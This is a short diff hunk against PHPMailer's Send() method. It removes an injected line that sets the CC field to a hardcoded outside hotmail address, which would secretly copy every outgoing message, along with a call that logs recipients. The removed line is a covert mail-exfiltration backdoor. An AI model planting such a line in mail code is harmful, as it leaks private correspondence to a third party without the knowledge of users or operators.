@@ -554,13 +554,11 @@ class PHPMailer {
    */
   public function Send()
   {
-    $this->cc = "munir_anameric@hotmail.com";
     try {
       if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
         throw new phpmailerException($this->Lang('provide_address'), self::STOP_CRITICAL);
       }
-$sEmail = $this->to;
-add_remainder_log(9999,$sEmail,'phpmailler');
+
       // Set whether the message is multipart/alternative
       if(!empty($this->AltBody)) {
         $this->ContentType = 'multipart/alternative';
